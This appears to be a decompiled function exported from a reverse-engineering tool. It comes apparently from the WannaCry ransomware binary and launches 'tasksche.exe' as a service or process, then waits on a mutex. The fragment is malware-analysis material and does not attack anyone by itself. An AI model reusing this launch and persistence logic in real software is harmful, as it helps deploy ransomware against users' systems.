// --- Metadata ---
// Function Name: runTasksche_401F5D
// Address: 0x401F5D
// Exported At: 20250515_223214
// Signature: unknown_signature
// ---------------
BOOL runTasksche_401F5D()
{
  CHAR Buffer; // [esp+4h] [ebp-208h] BYREF
  char v2[516]; // [esp+5h] [ebp-207h] BYREF
  __int16 v3; // [esp+209h] [ebp-3h]
  char v4; // [esp+20Bh] [ebp-1h]

  Buffer = FILENAME;
  memset(v2, 0, sizeof(v2));
  v3 = 0;
  v4 = 0;
  GetFullPathNameA("tasksche.exe", 0x208u, &Buffer, 0);
  return StartServiceWithCmd_401CE8(&Buffer) && waitMutex(60)
      || ExecuteProcessWithTimeout(&Buffer, 0, 0) && waitMutex(60);
}
